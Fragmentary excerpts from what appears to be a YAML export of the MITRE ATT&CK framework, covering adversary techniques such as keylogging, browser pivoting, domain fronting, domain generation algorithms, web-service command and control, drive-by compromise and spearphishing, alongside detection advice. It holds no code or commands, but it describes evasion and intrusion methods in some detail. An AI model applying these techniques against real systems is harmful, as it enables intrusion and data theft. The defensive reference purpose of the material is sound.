        Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsyncKeyState. (Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.

        Monitor the Registry for the addition of a Custom Credential Provider. (Citation: Wrightson 2012) Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in use by adversaries may help to catch the result of user input interception if new techniques are used.

(Citation: Cobalt Strike Browser Pivot) (Citation: ICEBRG Chrome Extensions)

        Browser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. (Citation: cobaltstrike manual)

      description: |-
        An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.

        Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.

        In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)

        Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.

        Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.

Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.

        If the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers. (Citation: Wikipedia File Header Signatures)

      description: |-
        Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.

        Other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)

      x_mitre_detection: "Encryption software and encrypted files can be detected
        in many ways. Common utilities that may be present on the system or brought
        in by an adversary may be detectable through process monitoring and monitoring
        for command-line arguments for known encryption utilities. This may yield
        a significant amount of benign events, depending on how systems in the environment
        are typically used. Often the encryption key is stated within command-line
        invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll
        may be used to perform encryption, decryption, or verification of file signatures.
        \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted
        data is being transmitted. (Citation: Zhang 2013) If the communications channel
        is unencrypted, encrypted files of known file types can be detected in transit
        during exfiltration with a network intrusion detection or data loss prevention
        system analyzing file headers. (Citation: Wikipedia File Header Signatures)"

      name: Connection Proxy
      description: |-
        Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.

        External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the internet and then the proxy would forward communications to the C2 server.

        Internal connection proxies can be used to consolidate internal connections from compromised systems. Adversaries may use a compromised internal system as a proxy in order to conceal the true destination of C2 traffic. The proxy can redirect traffic from compromised systems inside the network to an external C2 server making discovery of malicious traffic difficult. Additionally, the network can be used to relay information from one system to another in order to avoid broadcasting traffic to all systems.

      description: |-
        Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, "domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

        For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.

      description: |-
        Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)

        DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)

        Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)

        Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.

        Machine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain or related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Endgame Predicting DGA)

        Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.

        Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.

        The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.

      name: Port Knocking
      description: "Port Knocking is a well-established method used by both defenders
        and adversaries to hide open ports from access. To enable a port, an adversary
        sends a series of packets with certain characteristics before the port will
        be opened. Usually this series of packets consists of attempted connections
        to a predefined sequence of closed ports, but can involve unusual flags, specific
        strings or other unique characteristics. After the sequence is completed,
        opening a port is often accomplished by the host based firewall, but could
        also be implemented by custom software. \n\nThis technique has been observed
        to both for the dynamic opening of a listening port as well as the initiating
        of a connection to a listening server on a different system.\n\nThe observation
        of the signal packets to trigger the communication can be conducted through
        different methods. One means, originally implemented by Cd00r (Citation: Hartrell
        cd00r 2002), is to use the libpcap libraries to sniff for the packets in question.
        Another method leverages raw sockets, which enables the malware to use ports
        that are already open for use by other programs."

        Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.

        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

        Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

        ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.

        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.

        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

      name: Drive-by Compromise
      description: "A drive-by compromise is when an adversary gains access to a system
        through a user visiting a website over the normal course of browsing. With
        this technique, the user's web browser is typically targeted for exploitation,
        but adversaries may also use compromised websites for non-exploitation behavior
        such as acquiring application access tokens.\n\nMultiple ways of delivering
        exploit code to a browser exist, including:\n\n* A legitimate website is compromised
        where adversaries have injected some form of malicious code such as JavaScript,
        iFrames, and cross-site scripting.\n* Malicious ads are paid for and served
        through legitimate ad providers.\n* Built-in web application interfaces are
        leveraged for the insertion of any other kind of object that can be used to
        display web content or contain a script that executes on the visiting client
        (e.g. forum posts, comments, and other user controllable web content).\n\nOften
        the website used by an adversary is one visited by a specific community, such
        as government, a particular industry, or region, where the goal is to compromise
        a specific user or set of users based on a shared interest. This kind of targeted
        attack is referred to a strategic web compromise or watering hole attack.
        There are several known examples of this occurring. (Citation: Shadowserver
        Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A
        user visits a website that is used to host the adversary controlled content.\n2.
        Scripts automatically execute, typically searching versions of the browser
        and plugins for a potentially vulnerable version. \n    * The user may be
        required to assist in this process by enabling scripting or active website
        components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable
        version, exploit code is delivered to the browser.\n4. If exploitation is
        successful, then it will give the adversary code execution on the user's system
        unless other protections are in place.\n    * In some cases a second visit
        to the website after the initial scan is required before exploit code is delivered.\n\nUnlike
        [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190),
        the focus of this technique is to exploit software on a client endpoint upon
        visiting a website. This will commonly give an adversary access to systems
        on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries
        may also use compromised websites to deliver a user to a malicious application
        designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s,
        like OAuth tokens, to gain access to protected applications and information.
        These malicious applications have been delivered through popups on legitimate
        websites.(Citation: Volexity OceanLotus Nov 2017)"

        Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.

        Network intrusion detection systems, sometimes with SSL/TLS MITM inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.

        Detecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.

      name: Spearphishing Attachment
      description: |-
        Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.

        There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.

        Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

        Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) and [Scripting](https://attack.mitre.org/techniques/T1064).

        most kinds of spearphishing, the goal is to generate rapport with the target
        or get the target's interest in some way. Adversaries will create fake social
        media accounts and message employees for potential job opportunities. Doing
        so allows a plausible reason for asking about services, policies, and software
        that's running in an environment. The adversary can then send malicious links
        or attachments through these services.\n\nA common example is to build rapport
        with a target via social media, then send content to a personal webmail service
        that the target uses on their work computer. This allows an adversary to bypass
        some email restrictions on the work account, and the target is more likely
        to open the file since it's something they were expecting. If the payload
        doesn't work as expected, the adversary can continue normal communications
        and troubleshoot with the target on how to get it working."

        Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.

        account using Credential Access techniques or capture credentials earlier
        in their reconnaissance process through social engineering for means of gaining
        Initial Access. \n\nAccounts that an adversary may use can fall into three
        categories: default, local, and domain accounts. Default accounts are those
        that are built-into an OS such as Guest or Administrator account on Windows
        systems or default factory/provider set accounts on other types of systems,
        software, or devices. Local accounts are those configured by an organization
        for use by users, remote support, services, or for administration on a single
        system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts
        are those managed by Active Directory Domain Services where access and permissions
        are configured across systems and services that are part of that domain. Domain
        accounts can cover users, administrators, and services.\n\nCompromised credentials
        may be used to bypass access controls placed on various resources on systems
        within the network and may even be used for persistent access to remote systems
        and externally available services, such as VPNs, Outlook Web Access and remote
        desktop. Compromised credentials may also grant an adversary increased privilege
        to specific systems or access to restricted areas of the network. Adversaries
        may choose not to use malware or tools in conjunction with the legitimate
        access those credentials provide to make it harder to detect their presence.\n\nDefault
        accounts are also not limited to Guest and Administrator on client machines,
        they also include accounts that are preset for equipment such as network devices
        and computer applications whether they are internal, open source, or COTS.
        Appliances that come preset with a username and password combination pose
        a serious threat to organizations that do not change it post installation,
        as they are easy targets for an adversary. Similarly, adversaries may also
        utilize publicly disclosed private keys, or stolen private keys, to legitimately
        connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021)
        (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials,
        and permissions across a network of systems is of concern because the adversary
        may be able to pivot across accounts and systems to reach a high level of
        access (i.e., domain or enterprise administrator) to bypass access controls
        set within the enterprise. (Citation: TechNet Credential Theft)"
